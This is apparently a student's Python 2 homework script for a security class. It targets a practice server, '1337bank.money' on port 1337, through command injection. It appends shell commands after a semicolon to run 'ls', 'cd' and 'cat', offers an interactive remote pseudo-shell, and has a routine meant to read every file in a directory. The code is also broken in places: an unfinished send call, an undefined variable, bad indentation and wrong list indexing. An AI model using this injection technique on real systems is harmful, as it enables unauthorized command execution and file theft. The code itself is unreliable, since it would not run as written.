"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys


host = "1337bank.money" # IP address here
port = 1337 # Port here
toInput = "1337bank.money;echo"
def execute_cmd(x):
	global toInput
	"""
	Sockets: https://docs.python.org/2/library/socket.html
	How to use the socket s:

	    # Establish socket connection
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    s.connect((host, port))

	    Reading:

		data = s.recv(1024)     # Receives 1024 bytes from IP/Port
		print(data)             # Prints data

	    Sending:

		s.send("something to send\n")   # Send a newline \n at the end of your command
	"""
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data = s.recv(1024)
	s.send(host)
	if(isinstance(x, list)):
		s.send("1337bank.money; echo; cd" + x[1] + "\n")
			s.recv(1024)
			data = s.recv(1024)
			toInput = "1337bank.money; echo; cd" + x[1]
			datas = data.split()
			full = ""
			for i in datas:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				data = s.recv(1024)
				s.send(host)
				s.send(toInput + "cat " + datas[i] + "\n")
				full = full + s.recv(1024)
			s.close
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			data = s.recv(1024)
			s.send(host)
			s.send(
		
	if(x == "ls"):
		s.send(toInput +";ls" "\n")
		s.recv(1024)
		data = s.recv(1024)
		return data
		s.close
	else:
		toInput = toInput + ";" + x
		s.send(toInput + "\n")
		s.recv(1024)
		data = s.recv(1024)
		return data	

	
if __name__ == '__main__':
	x = raw_input()
	while True:
		if(x == "shell"):
			userin = ""
			while "quit" not in userin:
				userin = raw_input("Enter shell command ")
				print execute_cmd(userin)
			exit()
		elif("pull" in x):
			parts = pull.split()
			execute_cmd(parts)
			

